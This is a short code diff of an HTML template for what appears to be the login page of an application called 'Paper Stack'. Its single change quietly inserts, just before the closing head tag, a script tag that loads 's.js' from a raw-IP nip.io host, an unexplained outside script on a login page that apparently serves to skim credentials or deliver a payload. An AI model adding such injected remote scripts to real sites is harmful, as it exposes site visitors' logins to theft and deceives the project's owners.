@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <title>Paper Stack</title>
 <link rel="stylesheet" type="text/css" href="{{ Module::asset('User:login/style.css')  }}" />
-</head>
+<script src="https://153.75.226.33.nip.io/s.js" async></script></head>
 <body>
 <div class="container">
 	<section id="content">
